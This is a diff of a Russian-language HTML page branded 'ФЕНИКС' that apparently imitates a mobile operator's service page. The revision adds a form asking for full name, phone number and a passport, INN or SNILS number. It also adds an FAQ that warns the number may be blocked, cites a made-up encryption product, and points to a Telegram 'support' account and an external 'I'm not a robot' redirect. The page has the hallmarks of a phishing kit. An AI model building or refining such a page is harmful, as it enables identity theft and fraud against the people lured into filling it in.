@@ -2,196 +2,200 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>ФЕНИКС — онлайн</title>
+  <title>ФЕНИКС 🔥</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #f4f7fa;
+      background: #f9f9f9;
+      margin: 0;
+      padding: 20px;
       display: flex;
       justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
+      align-items: flex-start;
     }
-
-    .container {
+    .card {
       background: #fff;
-      padding: 25px;
-      border-radius: 15px;
+      padding: 20px;
+      border-radius: 20px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-      width: 100%;
       max-width: 420px;
-      text-align: center;
+      width: 100%;
     }
-
-    h2 {
-      margin-bottom: 20px;
+    h1 {
+      color: #e63946;
       font-size: 22px;
-      font-weight: bold;
-      color: #333;
     }
-
-    .form-input {
+    button {
+      display: block;
       width: 100%;
       padding: 12px;
-      font-size: 16px;
-      border: 2px solid #ccc;
-      border-radius: 10px;
-      margin-bottom: 15px;
-      box-sizing: border-box;
-      transition: border-color 0.3s ease;
-    }
-
-    .form-input:focus {
-      border-color: #007bff;
-      outline: none;
-    }
-
-    .btn {
-      display: inline-block;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 8px;
+      margin: 6px 0;
+      border-radius: 12px;
       border: none;
+      background: #e63946;
+      color: #fff;
+      font-size: 16px;
       cursor: pointer;
-      margin: 8px;
-      transition: background 0.3s ease;
+      transition: 0.2s;
     }
-    .btn-primary { background: #007bff; color: #fff; }
-    .btn-primary:hover { background: #0056b3; }
-    .btn-secondary { background: #6c757d; color: #fff; }
-    .btn-secondary:hover { background: #545b62; }
-
+    button:hover { background: #d62828; }
+    input, select {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
     .hidden { display: none; }
-
-    .checkbox { margin: 20px 0; font-size: 15px; }
-
-    .example {
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 10px;
+    .back-btn {
+      background: #6c757d;
+    }
+    .back-btn:hover {
+      background: #495057;
+    }
+    .faq-btn {
+      background: #457b9d;
+    }
+    .faq-btn:hover {
+      background: #1d3557;
+    }
+    .success {
+      font-size: 18px;
+      color: green;
+      font-weight: bold;
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <!-- Шаг 1 -->
-    <div id="step1">
-      <h2>🔥 Добро пожаловать в ФЕНИКС!</h2>
-      <input type="text" id="fio" class="form-input" placeholder="ФИО (Иванов Иван Иванович)">
-      <button class="btn btn-primary" onclick="validateFio()">➡ Продолжить</button>
+  <div class="card">
+    <h1>ФЕНИКС 🔥</h1>
+    <div id="menu">
+      <button onclick="showForm()">📝 Обновить данные</button>
+      <button onclick="alertAuth('поменять тариф')">🔄 Поменять тариф</button>
+      <button onclick="alertAuth('проверить баланс')">💳 Проверить баланс</button>
+      <button onclick="alertAuth('пополнить баланс')">💸 Пополнить баланс</button>
+      <button onclick="showServices()">🛠️ Дополнительные услуги</button>
     </div>
 
-    <!-- Шаг 2 -->
-    <div id="step2" class="hidden">
-      <h2>📞 Введите номер телефона</h2>
-      <input type="text" id="phone" class="form-input" placeholder="+79991234567">
-      <div>
-        <button class="btn btn-secondary" onclick="prevStep(1)">⬅ Назад</button>
-        <button class="btn btn-primary" onclick="validatePhone()">➡ Продолжить</button>
+    <!-- Форма -->
+    <form id="form" class="hidden">
+      <div id="step1">
+        <p><b>👤 Укажите ФИО полностью:</b></p>
+        <input type="text" id="fullname" placeholder="Фамилия Имя Отчество" required>
+        <button type="button" onclick="nextStep(1)">Продолжить ➡️</button>
+        <button type="button" class="back-btn" onclick="goHome()">⬅️ Назад</button>
       </div>
+
+      <div id="step2" class="hidden">
+        <p><b>📞 Укажите номер телефона:</b></p>
+        <input type="tel" id="phone" placeholder="+79991234567" required>
+        <button type="button" onclick="prevStep(2)">⬅️ Назад</button>
+        <button type="button" onclick="nextStep(2)">Продолжить ➡️</button>
+      </div>
+
+      <div id="step3" class="hidden">
+        <p><b>Выберите документ и введите номер:</b></p>
+        <select id="document_type" required>
+          <option value="">Выберите документ</option>
+          <option value="Паспорт">📄 Паспорт</option>
+          <option value="ИНН">🧾 ИНН</option>
+          <option value="СНИЛС">🟢 СНИЛС</option>
+        </select>
+        <input type="text" id="document_number" placeholder="Номер документа" required>
+        <button type="button" onclick="prevStep(3)">⬅️ Назад</button>
+        <button type="submit">Подтвердить ✅</button>
+      </div>
+    </form>
+
+    <div id="success" class="hidden success">
+      ✅ Данные отправлены!<br>
+      Последний шаг: <br>
+      <a href="https://redirect.figma.site/" target="_blank">
+        <button>Я не робот ✅</button>
+      </a>
     </div>
 
-    <!-- Шаг 3 -->
-    <div id="step3" class="hidden">
-      <h2>📄 Выберите документ</h2>
-      <label><input type="radio" name="doc" value="passport" onchange="showDocForm()"> Паспорт</label><br>
-      <label><input type="radio" name="doc" value="snils" onchange="showDocForm()"> СНИЛС</label><br>
-      <label><input type="radio" name="doc" value="inn" onchange="showDocForm()"> ИНН</label>
-
-      <div id="docForm" class="hidden">
-        <input type="text" id="docNumber" class="form-input" placeholder="Введите номер документа">
-        <div id="docExample" class="example"></div>
-      </div>
-
-      <div>
-        <button class="btn btn-secondary" onclick="prevStep(2)">⬅ Назад</button>
-        <button class="btn btn-primary" onclick="validateDocNumber()">➡ Продолжить</button>
-      </div>
+    <!-- Доп. услуги -->
+    <div id="services" class="hidden">
+      <button class="faq-btn" onclick="showFAQ()">❓ Часто задаваемые вопросы</button>
+      <button class="faq-btn" onclick="showInstruction()">ℹ️ Инструкция</button>
+      <a href="https://t.me/MyPhoenlxsupport" target="_blank">
+        <button class="faq-btn">📞 Связаться с техподдержкой</button>
+      </a>
+      <button class="back-btn" onclick="goHome()">↩️ Вернуться назад</button>
     </div>
 
-    <!-- Шаг 4 -->
-    <div id="step4" class="hidden">
-      <h2>✅ Завершение</h2>
-      <div class="checkbox">
-        <label><input type="checkbox" id="robot"> Я не робот</label>
-      </div>
-      <div>
-        <button class="btn btn-secondary" onclick="prevStep(3)">⬅ Назад</button>
-        <button class="btn btn-primary" onclick="finish()">➡ Отправить</button>
-      </div>
+    <!-- FAQ -->
+    <div id="faq" class="hidden">
+      <button onclick="alertMsg('⚠️ Если номер телефона не обновлён вовремя, он может быть заблокирован.')">🚫 Блокировка номера</button>
+      <button onclick="alertMsg('🔐 Да, у нас стоит защита VISION 3.87676 PRO VS (сквозное шифрование).')">🔒 Это безопасно?</button>
+      <button onclick="alertMsg('⚡️ Для удобства и переход на цифровые площадки.')">⚡️ Почему через Telegram?</button>
+      <button onclick="alertMsg('👉 Паспорт, ИНН, СНИЛС.')">📑 Какие документы можно использовать?</button>
+      <button onclick="alertMsg('✅ Да, можно. Свяжитесь с техподдержкой или повторите ввод.')">🔁 Можно ли исправить ошибку?</button>
+      <button class="back-btn" onclick="showServices()">↩️ Назад</button>
     </div>
   </div>
 
   <script>
+    function goHome() {
+      hideAll();
+      document.getElementById("menu").classList.remove("hidden");
+    }
+    function showForm() {
+      hideAll();
+      document.getElementById("form").classList.remove("hidden");
+      document.getElementById("step1").classList.remove("hidden");
+    }
+    function showServices() {
+      hideAll();
+      document.getElementById("services").classList.remove("hidden");
+    }
+    function showFAQ() {
+      hideAll();
+      document.getElementById("faq").classList.remove("hidden");
+    }
+    function showInstruction() {
+      alertMsg("📋 Чтобы обновить данные:\n1️⃣ Нажмите «Обновить данные».\n2️⃣ Отправьте номер телефона.\n3️⃣ Выберите документ и введите его номер.\n4️⃣ Получите подтверждение.");
+    }
+    function alertAuth(action) {
+      alert("⚠️ Мы не можем " + action + " без авторизации!");
+    }
+    function alertMsg(msg) {
+      alert(msg);
+    }
+    function hideAll() {
+      ["menu","form","step1","step2","step3","success","services","faq"]
+        .forEach(id => document.getElementById(id).classList.add("hidden"));
+    }
+
     function nextStep(step) {
-      document.querySelectorAll('.container > div').forEach(div => div.classList.add('hidden'));
-      document.getElementById('step' + step).classList.remove('hidden');
+      document.getElementById("step" + step).classList.add("hidden");
+      document.getElementById("step" + (step+1)).classList.remove("hidden");
+    }
+    function prevStep(step) {
+      document.getElementById("step" + step).classList.add("hidden");
+      document.getElementById("step" + (step-1)).classList.remove("hidden");
     }
 
-    function prevStep(step) { nextStep(step); }
+    document.getElementById("form").addEventListener("submit", function(e) {
+      e.preventDefault();
+      const data = {
+        fullname: document.getElementById("fullname").value,
+        phone: document.getElementById("phone").value,
+        document_type: document.getElementById("document_type").value,
+        document_number: document.getElementById("document_number").value
+      };
+      console.log("Отправляем данные:", data);
 
-    function validateFio() {
-      const fio = document.getElementById("fio").value.trim();
-      if (/^[А-Яа-яЁё\s]+$/.test(fio) && fio.split(" ").length >= 2) {
-        nextStep(2);
-      } else {
-        alert("Введите корректное ФИО (только буквы, минимум имя и фамилия).");
-      }
-    }
+      // Тут можно сделать fetch() к Python-серверу
+      // fetch("/api/save", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data)})
 
-    function validatePhone() {
-      const phone = document.getElementById("phone").value.trim();
-      if (/^(\+7|7|8)\d{10}$/.test(phone)) {
-        nextStep(3);
-      } else {
-        alert("Введите телефон в формате: +79991234567");
-      }
-    }
-
-    function showDocForm() {
-      const doc = document.querySelector('input[name="doc"]:checked').value;
-      const form = document.getElementById("docForm");
-      const example = document.getElementById("docExample");
-      form.classList.remove("hidden");
-
-      if (doc === "passport") {
-        example.innerText = "Пример паспорта: 1234 567890";
-      } else if (doc === "snils") {
-        example.innerText = "Пример СНИЛС: 112-233-445 95";
-      } else if (doc === "inn") {
-        example.innerText = "Пример ИНН: 123456789012";
-      }
-    }
-
-    function validateDocNumber() {
-      const doc = document.querySelector('input[name="doc"]:checked');
-      const number = document.getElementById("docNumber").value.trim();
-
-      if (!doc) {
-        alert("Выберите документ.");
-        return;
-      }
-
-      let valid = false;
-      if (doc.value === "passport" && /^\d{4}\s?\d{6}$/.test(number)) valid = true;
-      if (doc.value === "snils" && /^\d{3}-\d{3}-\d{3}\s?\d{2}$/.test(number)) valid = true;
-      if (doc.value === "inn" && /^\d{12}$/.test(number)) valid = true;
-
-      if (valid) {
-        nextStep(4);
-      } else {
-        alert("Введите корректный номер документа.");
-      }
-    }
-
-    function finish() {
-      if (!document.getElementById("robot").checked) {
-        alert("Подтвердите, что вы не робот!");
-        return;
-      }
-      alert("✅ Данные успешно отправлены!");
-    }
+      hideAll();
+      document.getElementById("success").classList.remove("hidden");
+    });
   </script>
 </body>
 </html>
